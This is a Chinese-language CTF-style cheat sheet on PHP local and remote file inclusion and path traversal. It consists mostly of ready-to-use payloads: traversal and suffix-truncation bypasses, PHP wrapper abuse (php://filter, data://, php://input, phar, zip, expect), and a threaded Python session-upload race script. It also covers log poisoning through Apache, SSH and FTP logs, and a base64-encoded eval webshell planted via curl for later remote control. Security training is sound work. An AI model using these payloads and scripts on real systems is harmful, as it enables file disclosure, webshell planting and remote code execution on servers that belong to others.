# 文件包含与路径穿越

## 1. 概述
文件包含漏洞（File Inclusion）允许攻击者将任意文件内容包含到PHP页面中执行。若被包含文件含PHP代码，代码会被执行。分为本地文件包含（LFI）和远程文件包含（RFI）。

**核心攻击面：**
- LFI：读取敏感文件 → get shell
- RFI：远程包含恶意代码直接get shell
- 伪协议利用：`php://filter`、`data://`、`phar://`、`expect://`
- Session文件包含
- 日志文件投毒

## 2. 核心原理

```php
// 漏洞代码
$file = $_GET['page'];
include($file . '.php');  // 后缀拼接
include("pages/" . $file); // 路径限制
```

**基本判断：**
```
?page=../../../../etc/passwd
?page=/etc/passwd
?page=C:\Windows\System32\drivers\etc\hosts
```

## 3. 关键技巧与Payload

### 3.1 路径穿越 (Directory Traversal)

**Linux路径遍历：**
```
# 基础
../../../../etc/passwd
../../../../etc/passwd%00    # %00截断PHP < 5.3.4
../../../../etc/passwd/././.  # 点号绕过某些过滤

# 数量不确定时的万能payload
....//....//....//....//etc/passwd
../../../etc/passwd
../../../etc/passwd%00.jpg

# PHP wrapper绝对路径
php://filter/read=convert.base64-encode/resource=../../../../etc/passwd

# 绕过 ../ 过滤
..././..././..././..././etc/passwd    # 中间加./
....//....//....//....//etc/passwd     # ....//替代../
..%2f..%2f..%2f..%2fetc%2fpasswd      # URL编码
..\/..\/..\/..\/etc\/passwd           # 反斜线
```

**Windows路径遍历：**
```
../../windows/system32/drivers/etc/hosts
../../windows/win.ini
C:\Windows\System32\drivers\etc\hosts
..\..\..\..\windows\win.ini
```

### 3.2 PHP伪协议大全

**php://filter (最常用，读文件源码)：**
```
# 基本读源码（base64编码防止PHP执行）
?page=php://filter/read=convert.base64-encode/resource=index.php
?page=php://filter/convert.base64-encode/resource=index

# 如果后缀被拼接（如 include($file.'.php')），去掉resource后缀
?page=php://filter/convert.base64-encode/resource=index
# 等价于include('php://filter/convert.base64-encode/resource=index.php')

# 多种编码链式组合
?page=php://filter/read=string.toupper|string.rot13/resource=index.php
?page=php://filter/read=convert.iconv.utf-8.utf-16/resource=index

# 写文件（利用php://filter + zlib压缩写shell）
?page=php://filter/write=convert.base64-decode/resource=shell.php
&txt=PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==
# 注意：POST的数据需在文件内没有干扰字符，用base64配合绕过
```

**data:// 伪协议 (RFI变体，需 allow_url_include=On)：**
```
# 直接执行PHP代码
?page=data://text/plain,<?php system('cat /flag');?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==

# 注意：+ = / 等字符需URL编码
?page=data://text/plain,<?php%20system('cat%20/flag');%20?>
```

**phar:// 伪协议 (反序列化触发)：**
```
# 上传 phar.jpg 后包含触发反序列化
?page=phar://uploads/phar.jpg/anyname
# phar文件结构中有序列化metadata，触发__wakeup()/__destruct()等魔术方法
```

**expect:// 伪协议 (需安装expect扩展)：**
```
?page=expect://cat /flag
?page=expect://ls
```

**zip:// 伪协议：**
```
# 压缩包内的文件包含
?page=zip://shell.zip%23shell.php    # %23 = #
?page=zip:///var/www/uploads/shell.zip#shell.php

# 使用场景：上传zip文件 → zip://包含
```

**php://input 伪协议 (POST数据作为PHP代码执行)：**
```
?page=php://input
# POST数据：<?php system('cat /flag');?>
# 条件：allow_url_include=On
```

### 3.3 绕过后缀拼接

**%00截断 (PHP < 5.3.4, magic_quotes_gpc=off)：**
```
?page=../../../etc/passwd%00
?page=../../../etc/passwd%00.jpg
```

**路径长度截断 (PHP < 5.2.8)：**
```
?page=../../../../etc/passwd/././././././(重复很多个.)
?page=../../../../etc/passwd/./././(超过4096字符)
```

**问号绕过：**
```
?page=php://filter/convert.base64-encode/resource=index.php?
# ?后面所有当作参数，忽略后缀拼接
```

**#号绕过：**
```
?page=php://filter/convert.base64-encode/resource=index.php%23
```

**利用包含的伪协议特性：**
```
# php://filter 中 不需要写后缀
?page=php://filter/convert.base64-encode/resource=index
# 会自动包含 index.php（如果有）
```

### 3.4 Session包含 (LFI to RCE)

**条件：** `session.upload_progress.enabled=1` (PHP默认) 且能找到session文件路径。

```python
import io, threading, requests

url = "http://target.com/index.php?page=/tmp/sess_attacker"

def write_session():
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        # PHP代码写在session filname中
        sess_data = {'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("cat /flag");?>'}
        r = requests.post(url, files={'file': ('a.txt', f)}, data=sess_data,
                         cookies={'PHPSESSID': 'attacker'})

def execute():
    while True:
        r = requests.get(url)
        if 'flag' in r.text:
            print(r.text)
            break

threading.Thread(target=write_session).start()
threading.Thread(target=execute).start()
```

**Session文件路径常见位置：**
```
/tmp/sess_<PHPSESSID>
/var/lib/php/sessions/sess_<PHPSESSID>
/var/lib/php5/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>
C:\Windows\Temp\sess_<PHPSESSID>
```

### 3.5 日志文件包含 (Log Poisoning)

**Apache Access Log投毒：**
```bash
# 方法1：修改User-Agent
# nc连接或发HTTP请求
nc target.com 80
GET /<?php system('cat /flag');?> HTTP/1.1
Host: target.com
User-Agent: <?php system('cat /flag');?>

# 方法2：请求一个不存在的路径（写入404日志）
http://target.com/<?php system('cat /flag');?>.php

# 然后包含日志文件
?page=/var/log/apache2/access.log
?page=/var/log/httpd/access_log
?page=/var/log/nginx/access.log
```

**SSH Auth Log投毒：**
```bash
ssh '<?php system("cat /flag");?>'@target.com
# PHP代码写入 /var/log/auth.log
# 包含
?page=/var/log/auth.log
```

**Error Log投毒：**
```
# 通过触发带PHP代码的报错
# 包含error log
?page=/var/log/apache2/error.log
```

**FTP Log投毒：**
```bash
ftp> open target.com
Name: <?php system('cat /flag');?>
# 包含 /var/log/vsftpd.log
```

## 4. 常见误区与注意事项
1. **allow_url_include vs allow_url_fopen**：`include`远程文件需要`allow_url_include=On`(更严格)，`fopen`读远程文件只需`allow_url_fopen=On`(默认On)。
2. **php://input在Nginx**：某些Nginx+FastCGI配置下`php://input`为空，需要检查CGI配置。
3. **日志权限**：`/var/log/apache2/access.log` 通常只有root可读，PHP进程可能无权访问（取决于PHP运行用户如www-data）。
4. **日志太大导致500**：access.log过大会导致PHP超时或内存溢出。可用`php://filter/read=convert.base64-encode/resource=` 包裹处理。
5. **php://filter的resource参数不写后缀**：当`include($file.'.php')`时，`resource=index` 等价于 `resource=index.php`。
6. **data://受allow_url_include约束**：PHP 5.2+将data://视为远程URL，需要`allow_url_include=On`。
7. **Session竞争条件不稳定**：需多次尝试；不同PHP版本session清理时间差也不同；PHP 7.4+ session文件名更随机。
8. **offline策略**：提前确认目标PHP版本决定可用伪协议和截断方法；准备好session/日志竞争脚本。

## 5. 实战示例

### 示例1：php://filter + 后缀拼接绕过
```
环境：include($_GET['page'].'.php');
```
Payload：
```
?page=php://filter/convert.base64-encode/resource=flag
# 实际包含: flag.php → 返回base64编码的flag.php源码
```

### 示例2：日志投毒Get Shell
```
环境：
  - LFI可控参数 include($_GET['page'])
  - Apache access.log 可读
```
步骤：
```bash
# 1. 投毒
curl "http://target.com/<?php @eval(\$_POST[1]);?>" -H "User-Agent: test"

# 2. 包含日志文件
curl "http://target.com/vuln.php?page=/var/log/apache2/access.log" -d "1=system('cat /flag');"

# 或者直接用蚁剑连接
# URL: http://target.com/vuln.php?page=/var/log/apache2/access.log
# 密码: 1
```
